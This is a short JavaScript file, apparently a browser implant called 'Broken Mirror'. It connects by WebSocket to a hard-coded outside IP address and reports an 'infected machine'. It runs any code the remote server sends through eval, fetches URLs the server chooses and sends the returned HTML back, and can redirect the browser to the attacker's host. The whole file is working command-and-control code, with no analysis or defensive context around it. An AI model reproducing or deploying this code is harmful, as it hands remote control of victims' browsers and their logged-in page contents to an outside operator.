var obj;
console.log('Broken Mirror Initialized');
var socket = new WebSocket('ws://188.166.57.205:1337');
socket.onopen = function () {
	socket.send(JSON.stringify({'req': 'Infected machine ready to reply...'}));
};
function handleObj(obj) {
	if (obj.request == 'eval')
		eval(obj.content);
	else if (obj.request == 'get')
		$.ajax({url: obj.url})
		.done(function(h) {
socket.send(JSON.stringify({'request': 'getresponse', 'html': h}));
console.log(h); });
  else if (obj.request == 'bm')
	  window.location.href = "http://188.166.57.205/";
}
socket.onmessage = function (message) {
        console.log('Broken Mirror message received');
	try { obj = JSON.parse(message.data); } catch(e) { }
	if (typeof(obj) === 'object')
		handleObj(obj);
};
socket.onerror = function (error) {
	console.log('WebSocket error: ' + error);
};
